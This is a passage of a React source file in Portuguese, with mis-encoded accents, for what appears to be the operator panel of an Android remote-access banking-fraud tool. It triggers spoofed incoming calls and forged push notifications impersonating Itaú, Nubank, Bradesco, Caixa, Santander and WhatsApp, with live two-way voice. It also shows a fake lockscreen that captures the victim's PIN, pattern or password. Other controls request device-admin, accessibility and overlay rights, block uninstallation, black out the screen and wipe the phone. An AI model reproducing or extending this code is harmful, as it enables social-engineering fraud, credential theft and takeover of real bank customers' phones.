                          className="py-1 px-1.5 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[9px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸ‘© Gerente Mulher
                        </button>
                      </div>
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        <Phone className="w-3 h-3 text-red-400" />
                        NÃºmero de ExibiÃ§Ã£o (Opcional):
                      </label>
                      <input
                        type="text"
                        value={sideFakeCallerNumber}
                        onChange={(e) => setSideFakeCallerNumber(e.target.value)}
                        placeholder="Ex: 0800 728 0728"
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        <Building2 className="w-3 h-3 text-red-400" />
                        Tema Visual do Banco:
                      </label>
                      <select
                        value={sideFakeBank}
                        onChange={(e) => setSideFakeBank(e.target.value)}
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none cursor-pointer shadow-inner"
                      >
                        <option value="itau">ItaÃº Uniclass (Laranja / Azul)</option>
                        <option value="nubank">Nubank (Roxo)</option>
                        <option value="bradesco">Bradesco (Vermelho)</option>
                        <option value="caixa">Caixa EconÃ´mica Federal (Azul)</option>
                        <option value="santander">Santander (Vermelho Intenso)</option>
                        <option value="geral">Central Geral de SeguranÃ§a</option>
                      </select>
                    </div>

                    {/* Modo de ExibiÃ§Ã£o da Chamada */}
                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        <Smartphone className="w-3 h-3 text-red-400" />
                        Modo de ExibiÃ§Ã£o no Celular:
                      </label>
                      <div className="grid grid-cols-2 gap-1.5">
                        <button
                          type="button"
                          onClick={() => setSideFakeDisplayMode('fullscreen')}
                          className={`py-2 px-2 rounded-lg border font-mono text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 cursor-pointer ${
                            sideFakeDisplayMode === 'fullscreen'
                              ? 'bg-red-950/90 border-red-400 text-pink-200 shadow-[0_0_12px_rgba(6,182,212,0.4)]'
                              : 'bg-[#030816] border-slate-700 text-slate-400 hover:border-slate-500'
                          }`}
                        >
                          <span>ðŸ“± Tela Cheia</span>
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideFakeDisplayMode('notification')}
                          className={`py-2 px-2 rounded-lg border font-mono text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 cursor-pointer ${
                            sideFakeDisplayMode === 'notification'
                              ? 'bg-red-950/90 border-red-400 text-pink-200 shadow-[0_0_12px_rgba(6,182,212,0.4)]'
                              : 'bg-[#030816] border-slate-700 text-slate-400 hover:border-slate-500'
                          }`}
                        >
                          <span>ðŸ”” NotificaÃ§Ã£o</span>
                        </button>
                      </div>
                      <span className="text-[8.5px] text-slate-400 block pt-0.5">
                        {sideFakeDisplayMode === 'notification'
                          ? 'âš¡ Aparece como notificaÃ§Ã£o no topo com botÃµes "Atender" e "Recusar"'
                          : 'âš¡ Aparece como ligaÃ§Ã£o recebida em tela cheia'}
                      </span>
                    </div>
                  </div>

                  {/* Status da Chamada */}
                  {sideFakeStatus && (
                    <div className="p-2 rounded-lg bg-[#060c18] border border-red-500/30 text-center font-mono text-[10.5px] text-pink-300 font-bold">
                      {sideFakeStatus}
                    </div>
                  )}

                  {/* BotÃµes de AÃ§Ã£o */}
                  <div className="space-y-2">
                    <button
                      type="button"
                      onClick={handleStartSideFakeCall}
                      className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-red-600 via-red-600 to-red-500 text-white font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(6,182,212,0.5)] border border-pink-300 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <PhoneIncoming className="w-4 h-4 text-red-100 animate-bounce" />
                      <span>ðŸ“ž DISPARAR FAKE CALL NO CELULAR</span>
                    </button>

                    {!isSideVoiceActive ? (
                      <button
                        type="button"
                        onClick={startSideVoiceCall}
                        className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-rose-600 via-teal-600 to-red-600 text-white font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(16,185,129,0.5)] border border-emerald-400 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer animate-pulse"
                      >
                        <Mic className="w-4 h-4 text-emerald-100" />
                        <span>ðŸŽ™ï¸ ABRIR VOZ & ÃUDIO 2-WAY</span>
                      </button>
                    ) : (
                      <div className="space-y-2 bg-[#061224] border border-emerald-500/40 rounded-xl p-2.5 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-black text-emerald-300 uppercase flex items-center gap-1.5">
                            <span className="w-2 h-2 rounded-full bg-rose-400 animate-ping"></span>
                            ðŸŸ¢ VOZ 2-WAY CONECTADA (AO VIVO)
                          </span>
                        </div>

                        <div className="grid grid-cols-2 gap-1.5">
                          <button
                            type="button"
                            onClick={() => setIsSideOpMuted(!isSideOpMuted)}
                            className={`py-2 px-2 rounded-lg border font-mono text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 cursor-pointer ${
                              isSideOpMuted
                                ? 'bg-rose-950/80 border-rose-500 text-rose-300'
                                : 'bg-[#09152b] border-red-500/40 text-pink-200'
                            }`}
                          >
                            {isSideOpMuted ? <MicOff className="w-3.5 h-3.5 text-rose-400" /> : <Mic className="w-3.5 h-3.5 text-red-400" />}
                            <span>{isSideOpMuted ? 'Mic: MUTADO' : 'Mic: ATIVO'}</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => setIsSideSpkMuted(!isSideSpkMuted)}
                            className={`py-2 px-2 rounded-lg border font-mono text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 cursor-pointer ${
                              isSideSpkMuted
                                ? 'bg-amber-950/80 border-amber-500 text-amber-300'
                                : 'bg-[#09152b] border-red-500/40 text-pink-200'
                            }`}
                          >
                            {isSideSpkMuted ? <VolumeX className="w-3.5 h-3.5 text-amber-400" /> : <Volume2 className="w-3.5 h-3.5 text-red-400" />}
                            <span>{isSideSpkMuted ? 'Ouvir: MUTADO' : 'Ouvir: ATIVO'}</span>
                          </button>
                        </div>

                        <button
                          type="button"
                          onClick={() => endSideVoiceCall()}
                          className="w-full py-2 px-3 rounded-xl bg-gradient-to-r from-rose-600 to-red-700 text-white font-black text-xs uppercase tracking-wider shadow-[0_0_15px_rgba(244,63,94,0.5)] border border-rose-400 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <PhoneOff className="w-4 h-4" />
                          <span>DESCONECTAR VOZ 2-WAY</span>
                        </button>
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={handleEndSideFakeCall}
                      className="w-full py-2 px-3 rounded-xl bg-rose-950/60 hover:bg-rose-900/80 border border-rose-600/50 text-rose-200 text-xs font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      <PhoneOff className="w-3.5 h-3.5" />
                      <span>Encerrar Chamada Forjada</span>
                    </button>
                  </div>
                </div>
              )}

              {/* Aba: FORJAR NOTIFICAÃ‡ÃƒO (PUSH BANNER FAKE SEPARADO) */}
              {sidePanelTab === 'fake_notif' && (
                <div className="space-y-3 pt-0.5 font-mono">
                  {/* CabeÃ§alho Forjar NotificaÃ§Ã£o */}
                  <div className="bg-gradient-to-r from-red-950/60 via-blue-950/60 to-red-950/60 border border-red-500/40 rounded-xl p-2.5 flex items-center justify-between shadow-[0_0_15px_rgba(6,182,212,0.2)]">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-red-500/20 border border-red-500/40 flex items-center justify-center text-pink-300 shrink-0">
                        <Bell className="w-4 h-4 animate-bounce" />
                      </div>
                      <div>
                        <span className="text-[11px] font-black text-pink-200 uppercase tracking-wide block flex items-center gap-1">
                          ðŸ”” FORJAR NOTIFICAÃ‡ÃƒO (FAKE PUSH)
                        </span>
                        <span className="text-[8.5px] text-slate-300 uppercase tracking-wider block">
                          Simular Alerta Flutuante de Banco / WhatsApp / Sistema
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Bloco Forjar NotificaÃ§Ã£o no Aparelho */}
                  <div className="bg-[#091224] border border-red-500/40 rounded-xl p-3 space-y-2.5 shadow-md font-mono">
                    <div className="flex items-center justify-between border-b border-red-500/20 pb-1.5">
                      <span className="text-[10px] font-bold text-pink-300 uppercase tracking-wider flex items-center gap-1.5">
                        <Bell className="w-3.5 h-3.5 text-red-400" />
                        âš™ï¸ CONFIGURAR E DISPARAR NOTIFICAÃ‡ÃƒO FAKE:
                      </span>
                    </div>

                    {/* Presets RÃ¡pidos */}
                    <div className="space-y-1 text-left">
                      <label className="text-[9.5px] font-bold text-slate-400 uppercase">
                        âš¡ Atalhos de NotificaÃ§Ã£o RÃ¡pida:
                      </label>
                      <div className="grid grid-cols-2 gap-1.5">
                        <button
                          type="button"
                          onClick={() => {
                            setSideNotifTitle('ItaÃº Uniclass');
                            setSideNotifText('Pix de R$ 1.500,00 recebido com sucesso.');
                            setSideNotifBank('itau');
                            setSideNotifIcon('itau');
                            setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Itau_logo.svg/512px-Itau_logo.svg.png');
                          }}
                          className="py-1.5 px-2 bg-[#040914] border border-red-500/30 hover:border-red-400 text-pink-200 text-[10px] font-bold rounded-lg transition-all text-left truncate cursor-pointer"
                        >
                          ðŸ’³ Pix Recebido
                        </button>

                        <button
                          type="button"
                          onClick={() => {
                            setSideNotifTitle('SeguranÃ§a ItaÃº');
                            setSideNotifText('Acesso nÃ£o reconhecido detectado. Clique para verificar.');
                            setSideNotifBank('itau');
                            setSideNotifIcon('itau');
                            setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Itau_logo.svg/512px-Itau_logo.svg.png');
                          }}
                          className="py-1.5 px-2 bg-[#040914] border border-red-500/30 hover:border-red-400 text-pink-200 text-[10px] font-bold rounded-lg transition-all text-left truncate cursor-pointer"
                        >
                          ðŸ” Alerta SeguranÃ§a
                        </button>

                        <button
                          type="button"
                          onClick={() => {
                            setSideNotifTitle('WhatsApp');
                            setSideNotifText('Gerente de Conta: OlÃ¡, preciso confirmar seu cadastro.');
                            setSideNotifBank('whatsapp');
                            setSideNotifIcon('whatsapp');
                            setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/512px-WhatsApp.svg.png');
                          }}
                          className="py-1.5 px-2 bg-[#040914] border border-red-500/30 hover:border-red-400 text-pink-200 text-[10px] font-bold rounded-lg transition-all text-left truncate cursor-pointer"
                        >
                          ðŸ’¬ WhatsApp Gerente
                        </button>

                        <button
                          type="button"
                          onClick={() => {
                            setSideNotifTitle('Nubank');
                            setSideNotifText('TransferÃªncia enviada. Confira o comprovante no app.');
                            setSideNotifBank('nubank');
                            setSideNotifIcon('nubank');
                            setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/512px-Nubank_logo_2021.svg.png');
                          }}
                          className="py-1.5 px-2 bg-[#040914] border border-red-500/30 hover:border-red-400 text-pink-200 text-[10px] font-bold rounded-lg transition-all text-left truncate cursor-pointer"
                        >
                          ðŸ’œ Notif. Nubank
                        </button>
                      </div>
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸŽ¨ Tema do Ãcone / Banco PadrÃ£o:
                      </label>
                      <select
                        value={sideNotifIcon}
                        onChange={(e) => {
                          setSideNotifIcon(e.target.value);
                          setSideNotifBank(e.target.value);
                        }}
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none cursor-pointer shadow-inner"
                      >
                        <option value="itau">ðŸŸ  ItaÃº Uniclass</option>
                        <option value="nubank">ðŸ’œ Nubank</option>
                        <option value="bradesco">ðŸ”´ Bradesco</option>
                        <option value="caixa">ðŸ”µ Caixa EconÃ´mica Federal</option>
                        <option value="santander">ðŸŸ¥ Santander</option>
                        <option value="whatsapp">ðŸŸ© WhatsApp</option>
                        <option value="inter">ðŸŸ§ Banco Inter</option>
                        <option value="c6">â¬› C6 Bank</option>
                        <option value="geral">ðŸ›¡ï¸ Alerta de SeguranÃ§a Geral</option>
                      </select>
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸ–¼ï¸ Foto / Logo Customizada do Ãcone (URL - Opcional):
                      </label>
                      <input
                        type="text"
                        value={sideNotifIconUrl}
                        onChange={(e) => setSideNotifIconUrl(e.target.value)}
                        placeholder="Ex: https://... (Deixe em branco para usar o banco acima)"
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />

                      {/* Atalhos RÃ¡pidos de Fotos do Ãcone */}
                      <div className="grid grid-cols-4 gap-1 pt-1">
                        <button
                          type="button"
                          onClick={() => setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Itau_logo.svg/512px-Itau_logo.svg.png')}
                          className="py-1 px-1 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[8.5px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸŸ  ItaÃº
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/512px-Nubank_logo_2021.svg.png')}
                          className="py-1 px-1 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[8.5px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸ’œ Nubank
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideNotifIconUrl('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/512px-WhatsApp.svg.png')}
                          className="py-1 px-1 bg-[#030816] border border-red-500/30 hover:border-red-400 text-pink-200 text-[8.5px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          ðŸŸ© WhatsApp
                        </button>
                        <button
                          type="button"
                          onClick={() => setSideNotifIconUrl('')}
                          className="py-1 px-1 bg-[#030816] border border-slate-700 hover:border-slate-500 text-slate-400 text-[8.5px] font-bold rounded transition-all truncate text-center cursor-pointer"
                        >
                          âŒ Limpar URL
                        </button>
                      </div>
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        âœï¸ TÃ­tulo da NotificaÃ§Ã£o:
                      </label>
                      <input
                        type="text"
                        value={sideNotifTitle}
                        onChange={(e) => setSideNotifTitle(e.target.value)}
                        placeholder="Ex: ItaÃº Uniclass, WhatsApp, Banco do Brasil..."
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none shadow-inner"
                      />
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        ðŸ“ ConteÃºdo / Mensagem da NotificaÃ§Ã£o:
                      </label>
                      <textarea
                        rows={2}
                        value={sideNotifText}
                        onChange={(e) => setSideNotifText(e.target.value)}
                        placeholder="Ex: VocÃª possui uma transferÃªncia de R$ 1.500,00 pendente..."
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-1.5 px-2.5 outline-none shadow-inner resize-none"
                      />
                    </div>

                    <div className="space-y-1 text-left">
                      <label className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-1">
                        âš¡ Ao Clicar na NotificaÃ§Ã£o no Celular:
                      </label>
                      <select
                        value={sideNotifAction}
                        onChange={(e) => setSideNotifAction(e.target.value)}
                        className="w-full bg-[#030816] border-2 border-red-500/50 focus:border-pink-300 text-pink-200 font-mono text-xs font-bold rounded-lg py-2 px-2.5 outline-none cursor-pointer shadow-inner"
                      >
                        <option value="fake_call">ðŸ“ž Abrir Chamada Falsa (Fake Call)</option>
                        <option value="none">ðŸ”” Apenas Exibir NotificaÃ§Ã£o na Barra</option>
                      </select>
                    </div>

                    <div className="flex items-center gap-2 text-left pt-1">
                      <input
                        type="checkbox"
                        id="sideNotifSoundToggle"
                        checked={sideNotifSound}
                        onChange={(e) => setSideNotifSound(e.target.checked)}
                        className="w-4 h-4 rounded border-red-500/50 bg-[#030816] text-red-500 focus:ring-0 cursor-pointer"
                      />
                      <label htmlFor="sideNotifSoundToggle" className="text-[10.5px] font-bold text-pink-200 uppercase cursor-pointer flex items-center gap-1">
                        ðŸ”Š Tocar som de notificaÃ§Ã£o e vibrar celular
                      </label>
                    </div>

                    {sideNotifStatus && (
                      <div className="p-2 rounded-lg bg-[#060c18] border border-red-500/30 text-center font-mono text-[10.5px] text-pink-300 font-bold">
                        {sideNotifStatus}
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={handleTriggerSideFakeNotification}
                      className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-red-600 via-red-600 to-red-500 text-white font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(6,182,212,0.5)] border border-pink-300 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <Bell className="w-4 h-4 text-red-100 animate-bounce" />
                      <span>ðŸš€ ENVIAR NOTIFICAÃ‡ÃƒO FAKE AO CELULAR</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 2.5 VISÃƒO: CENTRAL DE ADMIN, LOCK & PIN (GERENCIAMENTO AVANÃ‡ADO)  */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'admin_security' && (
          <div className="w-full max-w-6xl space-y-4 animate-in fade-in zoom-in duration-150 font-mono">
            {/* Top Bar Header */}
            <div className="bg-[#081020]/90 backdrop-blur-2xl border border-amber-500/40 rounded-2xl p-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 shadow-[0_0_35px_rgba(245,158,11,0.15)]">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500/20 via-rose-500/20 to-red-500/20 border border-amber-500/50 flex items-center justify-center text-amber-400 shadow-[0_0_20px_rgba(245,158,11,0.3)]">
                  <ShieldCheck className="w-6 h-6 animate-pulse" />
                </div>
                <div>
                  <h2 className="text-base font-black text-white uppercase tracking-wider flex items-center gap-2">
                    CENTRAL DE ADMIN, LOCK & PIN
                    <span className="text-[10px] px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold">
                      PRIVILÃ‰GIOS TÃTICOS
                    </span>
                  </h2>
                  <p className="text-xs text-slate-400 font-sans mt-0.5">
                    Controle de Administrador do Dispositivo, bloqueio de tela, injeÃ§Ã£o de PIN/PadrÃ£o e telas de captura
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={handleCheckAdminStatus}
                  className="px-3 py-2 rounded-xl bg-[#0a1426] border border-[#162744] hover:border-red-500/50 text-pink-300 text-xs font-bold uppercase transition-all flex items-center gap-1.5"
                  title="Verificar status do Device Admin"
                >
                  <RefreshCw className="w-3.5 h-3.5" /> Checar Status
                </button>
                <button
                  onClick={() => setActiveTab('live_screen')}
                  className="px-4 py-2 rounded-xl bg-gradient-to-r from-red-600 to-red-600 text-white text-xs font-bold uppercase transition-all flex items-center gap-1.5 shadow-[0_0_15px_rgba(37,99,235,0.4)]"
                >
                  <Tv className="w-3.5 h-3.5" /> Ir para Tela ao Vivo
                </button>
              </div>
            </div>

            {/* Grid Principal de MÃ³dulos (3 Colunas) */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {/* ========================================================= */}
              {/* CARD 1: PRIVILÃ‰GIOS DE ADMIN & PERMISSÃ•ES                 */}
              {/* ========================================================= */}
              <div className="bg-[#081020]/90 backdrop-blur-2xl border border-[#14233e] hover:border-amber-500/50 rounded-2xl p-4 shadow-xl space-y-3.5 flex flex-col justify-between transition-all">
                <div className="space-y-3">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-2">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
                        <ShieldAlert className="w-4 h-4" />
                      </div>
                      <span className="text-xs font-black text-amber-300 uppercase tracking-wide">
                        1. PrivilÃ©gios & Admin
                      </span>
                    </div>
                    <span className="text-[9px] px-2 py-0.5 rounded-full bg-rose-500/20 text-emerald-300 border border-emerald-500/30 font-bold">
                      ATIVO
                    </span>
                  </div>

                  {/* BotÃ£o de Destaque: Solicitar Device Admin */}
                  <button
                    onClick={handleRequestAdmin}
                    className="w-full py-3 px-3 rounded-xl bg-gradient-to-r from-amber-600 via-rose-600 to-red-600 hover:from-amber-500 hover:to-rose-500 text-white font-black text-xs uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(244,63,94,0.4)] border border-amber-400/50 group"
                  >
                    <ShieldCheck className="w-4 h-4 group-hover:scale-110 transition-transform" />
                    ðŸ›¡ï¸ SOLICITAR DEVICE ADMIN
                  </button>

                  <p className="text-[10.5px] text-slate-400 font-sans leading-relaxed">
                    Eleva o aplicativo para Administrador do Dispositivo, permitindo controle profundo de seguranÃ§a e bloqueio permanente.
                  </p>

                  {/* Grid de PermissÃµes CrÃ­ticas */}
                  <div className="grid grid-cols-2 gap-2 pt-1">
                    <button
                      onClick={handleRequestAccessibility}
                      className="p-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-red-500/50 text-slate-200 text-[10px] font-bold uppercase transition-all flex flex-col items-center gap-1 text-center"
                    >
                      <Zap className="w-4 h-4 text-red-400" />
                      <span>Acessibilidade</span>
                    </button>

                    <button
                      onClick={handleRequestBatteryOptimization}
                      className="p-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-emerald-500/50 text-slate-200 text-[10px] font-bold uppercase transition-all flex flex-col items-center gap-1 text-center"
                    >
                      <Battery className="w-4 h-4 text-emerald-400" />
                      <span>Ignorar Bateria</span>
                    </button>

                    <button
                      onClick={handleRequestOverlay}
                      className="p-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-red-500/50 text-slate-200 text-[10px] font-bold uppercase transition-all flex flex-col items-center gap-1 text-center"
                    >
                      <Layers className="w-4 h-4 text-red-400" />
                      <span>SobreposiÃ§Ã£o</span>
                    </button>

                    <button
                      onClick={() => {
                        sendCommand({ action: 'TOGGLE_BOT_OPTION', option: 'anti_delete', value: true });
                        showToast('ProteÃ§Ã£o Anti-DesinstalaÃ§Ã£o ativada!', 'success');
                      }}
                      className="p-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-amber-500/50 text-slate-200 text-[10px] font-bold uppercase transition-all flex flex-col items-center gap-1 text-center"
                    >
                      <Lock className="w-4 h-4 text-amber-400" />
                      <span>Anti-RemoÃ§Ã£o</span>
                    </button>
                  </div>
                </div>

                {/* Zona de Perigo & DesinstalaÃ§Ã£o */}
                <div className="pt-3 border-t border-[#14233e] space-y-2">
                  <button
                    onClick={() => setShowSelfDestructModal(true)}
                    className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-rose-950 via-red-900 to-rose-900 hover:from-rose-900 hover:to-red-800 text-rose-100 hover:text-white border border-rose-500/60 font-black text-xs uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(244,63,94,0.3)] group active:scale-95"
                  >
                    <Trash2 className="w-4 h-4 text-rose-400 group-hover:scale-110 transition-transform" />
                    ðŸ—‘ï¸ REMOVER APLICATIVO REMOTO (SELF-DESTRUCT)
                  </button>

                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => setShowUninstallCustomAppModal(true)}
                      className="py-2 px-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-rose-500/50 text-slate-200 text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 text-center"
                    >
                      <Package className="w-3.5 h-3.5 text-rose-400" />
                      <span>Desinstalar App</span>
                    </button>

                    <button
                      onClick={() => setShowWipeConfirm(true)}
                      className="py-2 px-2.5 rounded-xl bg-red-950/40 hover:bg-red-900/60 text-red-300 hover:text-white border border-red-800/50 text-[10px] font-bold uppercase transition-all flex items-center justify-center gap-1 text-center"
                    >
                      <Trash2 className="w-3.5 h-3.5 text-red-400" />
                      <span>Wipe Aparelho</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* ========================================================= */}
              {/* CARD 2: BLOQUEIO, DESBLOQUEIO & TELAS FALSAS             */}
              {/* ========================================================= */}
              <div className="bg-[#081020]/90 backdrop-blur-2xl border border-[#14233e] hover:border-red-500/50 rounded-2xl p-4 shadow-xl space-y-3.5 flex flex-col justify-between transition-all">
                <div className="space-y-3">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-2">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-lg bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400">
                        <Lock className="w-4 h-4" />
                      </div>
                      <span className="text-xs font-black text-pink-300 uppercase tracking-wide">
                        2. Bloqueio & Telas
                      </span>
                    </div>
                    <span className="text-[9px] text-slate-400 font-mono">Controle Direto</span>
                  </div>

                  {/* Bloquear e Desbloquear */}
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={handleLockDevice}
                      className="py-2.5 px-3 rounded-xl bg-amber-950/40 hover:bg-amber-900/60 border border-amber-600/50 hover:border-amber-400 text-amber-200 text-xs font-black uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(245,158,11,0.2)]"
                    >
                      <Lock className="w-4 h-4 text-amber-400" />
                      Bloquear Tela
                    </button>

                    <button
                      onClick={handleUnlockDevice}
                      className="py-2.5 px-3 rounded-xl bg-rose-950/40 hover:bg-rose-900/60 border border-emerald-600/50 hover:border-emerald-400 text-emerald-200 text-xs font-black uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(16,185,129,0.2)]"
                    >
                      <Unlock className="w-4 h-4 text-emerald-400" />
                      Desbloquear
                    </button>
                  </div>

                  {/* Despertar e Modo Oculto */}
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => {
                        sendCommand({ action: 'WAKEUP' });
                        showToast('Comando de Despertar tela enviado!', 'success');
                      }}
                      className="py-2 px-2.5 rounded-xl bg-[#0a1426] hover:bg-[#0f1e38] border border-[#162744] hover:border-red-500/50 text-pink-300 text-[10.5px] font-bold uppercase transition-all flex items-center justify-center gap-1.5"
                    >
                      <Sun className="w-3.5 h-3.5 text-amber-300" />
                      Despertar Tela
                    </button>

                    <button
                      onClick={() => handleToggleBlackScreen(!isBlackScreen)}
                      className={`py-2 px-2.5 rounded-xl border text-[10.5px] font-bold uppercase transition-all flex items-center justify-center gap-1.5 ${
                        isBlackScreen
                          ? 'bg-red-500 text-black border-pink-300 shadow-[0_0_12px_rgba(6,182,212,0.5)]'
                          : 'bg-[#0a1426] border-[#162744] text-slate-300 hover:text-white'
                      }`}
                    >
                      <EyeOff className="w-3.5 h-3.5" />
                      {isBlackScreen ? 'Preta ON' : 'Tela Preta'}
                    </button>
                  </div>

                  {/* Lockscreen Falsa (Captura de PIN) */}
                  <div className="bg-[#060c18] border border-[#101b2f] rounded-xl p-2.5 space-y-2">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">
                      ðŸŽ­ Lockscreen Falsa (Capturar PIN/Senha):
                    </span>
                    <div className="grid grid-cols-3 gap-1">
                      {(['pin', 'pattern', 'password'] as const).map((t) => (
                        <button
                          key={t}
                          onClick={() => setFakeLockType(t)}
                          className={`py-1 text-center rounded-lg text-[9.5px] font-bold uppercase transition-all ${
                            fakeLockType === t
                              ? 'bg-[#0070f3] text-white shadow-[0_0_8px_rgba(0,112,243,0.4)]'
                              : 'bg-[#0a1426] text-slate-400 hover:text-slate-200 border border-[#14233e]'
                          }`}
                        >
                          {t === 'pin' ? 'PIN 4-6D' : t === 'pattern' ? 'PadrÃ£o' : 'Senha'}
                        </button>
                      ))}
                    </div>

                    <div className="grid grid-cols-2 gap-2 pt-0.5">
                      <button
                        onClick={() => handleShowLockscreenOverlay(fakeLockType)}
                        className="py-2 px-2 rounded-xl bg-red-600 hover:bg-red-500 text-white font-bold text-[10px] uppercase transition-all flex items-center justify-center gap-1.5 shadow-md"
                      >
                        <Play className="w-3 h-3" /> Exibir Lock
                      </button>
                      <button
                        onClick={handleHideLockscreenOverlay}
                        className="py-2 px-2 rounded-xl bg-[#0e1c36] hover:bg-[#14284d] text-slate-300 font-bold text-[10px] uppercase transition-all flex items-center justify-center gap-1.5 border border-[#182d52]"
                      >
                        <X className="w-3 h-3" /> Ocultar Lock
                      </button>
                    </div>
                  </div>

                  {/* Bloqueio de Apps */}
                  <div className="space-y-1.5 pt-1 border-t border-[#14233e]">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">
